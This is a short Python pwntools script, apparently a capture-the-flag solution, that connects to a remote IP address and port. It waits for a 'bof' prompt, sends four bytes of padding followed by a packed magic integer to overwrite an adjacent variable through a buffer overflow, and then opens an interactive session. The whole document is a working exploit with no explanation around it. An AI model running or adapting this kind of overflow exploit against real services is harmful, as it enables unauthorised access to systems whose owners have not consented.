from pwn import *

r = remote('111.198.29.45', 59625)
payload = 'a' * (0x60106C - 0x601068) + p64(1853186401)

r.recvuntil("bof")
r.sendline(payload)
r.interactive()
